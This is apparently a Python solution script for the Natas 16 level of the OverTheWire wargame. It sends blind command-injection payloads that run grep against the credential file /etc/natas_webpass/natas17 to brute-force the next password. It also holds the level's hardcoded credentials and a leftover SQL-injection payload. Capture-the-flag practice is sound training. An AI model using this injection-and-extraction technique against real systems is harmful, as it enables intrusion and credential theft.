import asyncio
import aiohttp
import string
import base64

def string_to_hex(s):
    return ''.join(format(ord(char), '02x') for char in s)

username = "natas16"
password = "hPkjKYviLQctEW33QmuXL6eDVfMW4sGo"

URL = 'http://natas16.natas.labs.overthewire.org/index.php'
SESSION_ID = "123"
cookies = {'PHPSESSID':SESSION_ID}
headers = {'Authorization':'Basic {}'.format(base64.b64encode((username+':'+password).encode()).decode())}

semaphore = asyncio.Semaphore(5)  # Limit concurrent requests

async def fetch(session, payload):
    params = {'needle':payload}

    timeout = aiohttp.ClientTimeout(total=10)  # Increase timeout duration
    try:
        async with session.post(URL, params=params, headers=headers, timeout=timeout) as response:
            return await response.text()
    except asyncio.TimeoutError:
        # print(f"Timeout occurred for payload: {payload}")
        return "timeout"  # Placeholder for timeout

async def find_password_length(session):
    for length in range(1, 50):  # Adjust the range based on expected max length
        payload = f"natas16\" and LENGTH(password) like {length}#"
        response = await fetch(session, payload)
        if "African" in response:
            print(f"Password length found: {length}")
            return length
    return None  # Return None if length not found

async def main():
    async with aiohttp.ClientSession() as session:
        # password_length = await find_password_length(session)
        password_length = 32 # we know that in this challenge the password length is always 32 bytes long

        if password_length is None:
            print("Could not determine password length.")
            return
        
        password = ""
        i = len(password) + 1
        character_set =  string.ascii_letters + string.digits + "_" + "{" + "}" + "-"+ '!' + "?" 

        while len(password) < password_length:
            tasks = []
            for c in character_set:  # Iterate through character set
                # hex = string_to_hex((password+c).replace("_", r"\_"))
                payload = "$(grep -E ^{} /etc/natas_webpass/natas17)African".format(password+c)
                
                # print(c + " " + payload)
                tasks.append(fetch(session, payload))

                await asyncio.sleep(0.1)  # Delay between requests

            responses = await asyncio.gather(*tasks)

            for index, response in enumerate(responses):
                if index < len(character_set) and "African" not in response:
                    c = character_set[index]  # Correctly access character from character set
                    password += c
                    print(password.ljust(password_length, '*'))
                    break
            
            i += 1  # Move to the next character position

if __name__ == "__main__":
    asyncio.run(main())